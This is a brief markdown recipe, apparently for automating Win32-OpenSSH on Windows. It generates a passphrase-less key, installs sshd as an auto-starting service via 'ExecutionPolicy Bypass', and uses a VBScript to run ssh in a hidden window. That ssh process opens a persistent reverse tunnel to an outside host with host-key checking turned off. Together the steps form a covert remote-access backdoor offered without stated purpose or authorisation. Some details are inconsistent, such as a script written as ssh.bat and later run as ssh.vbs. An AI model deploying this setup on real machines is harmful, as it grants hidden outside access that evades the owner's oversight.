## Automate [Win32-OpenSSH](https://github.com/PowerShell/Win32-OpenSSH) 
```shell
wget https://github.com/PowerShell/Win32-OpenSSH/releases/download/V8.6.0.0p1-Beta/OpenSSH-Win64.zip
unzip OpenSSH-Win64.zip -d /tmp
cd /tmp/OpenSSH-Win64/
ssh-keygen -t rsa -b 4096 -f rsa -N '' -C ''
mv rsa.pub administrators_authorized_keys
```
```
cat << EOF >> sshd_config_default
ListenAddress 127.0.0.1
ListenAddress ::1 
Port 2222

PermitEmptyPasswords no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys

AllowTcpForwarding yes
Subsystem	sftp	sftp-server.exe
EOF
```
```
cat << EOF >> ssh.bat
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\Progra~1\openssh\ssh.bat" & Chr(34), 0
Set WshShell = Nothing
EOF
```
c:\Progra~1\openssh\ssh -o "StrictHostKeyChecking=no" -i pri -NfR 22222:localhost:2222 username@hostname
```
cat << EOF >> install.bat
powershell -ExecutionPolicy Bypass -File install-sshd.ps1
powershell Start-Service -Name "sshd"
powershell Start-Service -Name "ssh-agent"
powershell Set-Service -Name "sshd" -StartupType Automatic
powershell Set-Service -Name "ssh-agent" -StartupType Automatic

icacls administrators_authorized_keys /inheritance:r
icacls administrators_authorized_keys /grant SYSTEM:(F)
icacls administrators_authorized_keys /grant BUILTIN\Administrators:(F)
icacls pri /inheritance:r
icacls pri /grant SYSTEM:(F)
icacls pri /grant BUILTIN\Administrators:(F)

move administrators_authorized_keys %PROGRAMDATA%\ssh
WSCript C:\Progra~1\openssh\ssh.vbs
EOF
```
